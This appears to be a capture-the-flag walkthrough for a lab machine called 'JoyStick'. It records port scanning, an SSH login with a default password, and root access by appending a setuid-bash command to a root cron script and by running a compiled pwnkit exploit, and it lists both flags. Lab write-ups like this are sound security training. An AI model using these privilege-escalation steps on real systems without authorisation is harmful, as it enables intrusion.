# Box Name

## JoyStick

## Overview
---
* [[#Enumeration]]
	* nmap

* [[#Initial Foothold]]
	* ssh

* [[#Privilege Escalation]]
	* crontab,pwnkit

---
## Enumeration
---
 - ## nmap
  ```js
┌──(kn1ght㉿Kali)-[~/THM/joystic]
└─$ rustscan -r 1-65535 -a 10.10.98.43 --ulimit 5000 -- -sCV -oN nmap/all_ports
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.98.43:22
Open 10.10.98.43:21
Open 10.10.98.43:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c7:ce:5d:fa:24:68:3a:10:63:f9:28:1b:f4:6d:e5:bc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDviekIGKBudV6eCKiRkvoK3+KbLYFlqNUkOi/nphorAqF22v/wOzvbr9hcn7/S6STJeYDHVpsKl2Ku5COzQs7zbWkv/jH9LX6R0s5pICbohVvCDjeEvdaMks9yU1/5AYj25RPi1SMLq3boEKuJiu1J+i+ADVTcE4PxvPT6rDOvh9TwVYzWuuezz8nrejAhJGvamsaaJzstZQkn+I7cY2TAeRoRJqnOmLffmNQfG2T4hDm7pg8x7nSHIStlGl3i+SZepokyPm4+rW9tKiJ9bPa9CoW7i/uT7gBFJYGNFPK8i5Rh7KIphWE7W8iMZjNE7ujTSUHnWchGyBmFihEuz777
|   256 6b:7b:f5:12:e0:db:bb:b0:ca:f8:f8:c0:84:bc:27:e6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAFywRYgcs+ORO0qsevRGXL7QGqLeUlNAYjDTWs7FG9hQYYA50Znen7XGzSPIY6gt57HUYp2bWD12rKLw4rcnQw=
|   256 1b:d4:20:23:d0:5b:32:16:ad:c2:a9:cd:99:1c:e6:6e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOVUvn4lBmcT/u4LxGHkddF39Y3bAnk8CmiVa2DGKFWU
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: JoyStick Gaming
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```

---
## Initial Foothold
---
- ## web source page
```
<!-- Zach, I don't care that you named your user steve. You still need to
      finish making the website -->
    <!-- Great, and now the FTP server just doesn't work. Just another great idea after
	your failed irc chat. Why would we use that when we have in game chat? 
	Not to mention that I know you still haven't reset your password.  -->
```

 - ## ssh
	 - used default password of changeme to ssh in as steve
```bash
steve@notch-VirtualBox:~$ cat user.txt
flag{is_only_gaem}
steve@notch-VirtualBox:~$ 
```
---
## Privilege Escalation
----
 - ## crontab
	 - there is a crontab running /opt/minecraft/backup.sh as root
	 - cat /opt/minecraft/backup.sh
```bash
#! /bin/bash

# TODO Make this an actual backup script - Notch
# Steve, if you can you should get this wrapped up before the playtime tonight.
```

 - ## modify backup.sh 
```bash
#! /bin/bash
cp /bin/bash /tmp; chmod +s /tmp/bash
# TODO Make this an actual backup script - Notch
# Steve, if you can you should get this wrapped up before the playtime tonight.
 ```

 - ## wait for crontab to fire 
```bash
steve@notch-VirtualBox:/tmp$ ./bash -p
bash-4.3# id
uid=1002(steve) gid=1002(steve) euid=0(root) egid=0(root) groups=0(root),1002(steve)

# cat /home/notch/root.txt	
flag{poorly_configured_permissions}
```


 - ## pwnkit
```bash
steve@notch-VirtualBox:/tmp$ gcc -o pwn pwnkit.c

steve@notch-VirtualBox:/tmp$ ./pwn

# id
uid=0(root) gid=0(root) groups=0(root),1002(steve)

# cat /home/notch/root.txt	
flag{poorly_configured_permissions}
```